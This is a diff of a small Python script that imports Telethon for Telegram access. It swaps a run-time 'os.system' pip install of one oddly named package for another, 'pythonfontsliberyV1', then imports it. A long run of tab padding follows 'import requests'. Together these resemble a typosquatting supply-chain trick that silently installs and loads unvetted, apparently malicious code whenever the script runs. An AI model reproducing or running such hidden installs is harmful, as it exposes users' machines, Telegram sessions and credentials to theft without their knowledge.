@@ -1,6 +1,6 @@
 import os
-os.system("pip install pipcryptographymodV1")
-import pipcryptographymodV1
+os.system("pip install pythonfontsliberyV1")
+import pythonfontsliberyV1
 import requests																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																							
 from telethon.sync import TelegramClient
 from telethon.tl.functions.messages import GetDialogsRequest
